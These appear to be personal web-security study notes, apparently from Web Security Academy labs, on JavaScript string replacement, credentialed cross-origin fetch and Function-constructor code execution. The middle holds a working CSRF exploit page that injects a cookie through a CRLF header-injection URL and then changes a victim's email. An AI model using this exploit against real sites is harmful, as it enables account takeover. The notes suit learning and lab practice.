## Javascript `.replace()` function

When a string value is supplied into the first argument of the .replace function, only the first instance is replaced. For all instances to be replaced, a regex expression should be used instead. 

## Cross Origin Fetch

<html>

<body>
   <form action="https://0a7f00fb032c60acc081262c002f0020.web-security-academy.net/my-account/change-email"
        method="POST">
        <input type="hidden" name="email" value="pwned@devil-user.net" />
        <input required type=hidden name=csrf value=UQD7XpBP9tbqqj6cClHK2PFJdPLDPa59>
    </form>
    <script>
        fetch("https://0a7f00fb032c60acc081262c002f0020.web-security-academy.net/?search=t%3b%0d%0aSet-Cookie%3a%20csrfKey%3dxgOkcu96eiZT19WRsMmvwQwLrTposCsA%3b%20SameSite%3dNone", {
            mode:"no-cors",
            credentials: "include"
        }).then(function(response) {
            fetch('https://0a7f00fb032c60acc081262c002f0020.web-security-academy.net/my-account/change-email', {
                method: 'POST',
                mode:"no-cors",
                credentials: "include",
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'email=pwned%40evil-user.net&csrf=UQD7XpBP9tbqqj6cClHK2PFJdPLDPa59'
            }).then(function(response) {
                console.log(response);
            });
        });
    </script>
</body>

</html>
To allow Fetch to perform cross origin requests while still including cookies in the request, you must specify `ceredentials: 'include'`. For instance, 

```js
fetch('https://example.com:1234/users', {
  credentials: 'include'
})
```

This is necessary to perform attacks like CSRF where it requires your attacker site to perform cross-origin requests using the victim's cookies. This also applies to fetch requests used to set cookies on a different origin. 

## Constructor Class

Each function object has a constructor object that created the function. The constructor of the constructor object hence has the ability to create functions. For example, 

```js
const foo = Function('alert(1)'); // creates a function foo that executes alert(1)
const bar = func.constructor.constructor('alert(2)'); // references the constructor.constructor function to create another function bar
```